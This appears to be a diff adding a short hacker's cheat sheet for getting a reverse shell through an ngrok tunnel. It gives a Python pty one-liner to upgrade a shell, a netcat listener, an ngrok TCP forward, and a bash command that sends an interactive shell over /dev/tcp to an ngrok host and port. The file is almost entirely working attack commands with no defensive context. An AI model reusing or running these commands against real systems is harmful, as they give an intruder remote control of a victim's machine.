@@ -1,0 +1,12 @@
+# Upgrade shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# ngrok reverse shell
+
+nc -nvlp 8888
+ngrok tcp 8888
+
+# Get url/port from ngrok
+
+bash -c 'bash -i >& /dev/tcp/XX.tcp.ngrok.io/PORT 0>&1'
+
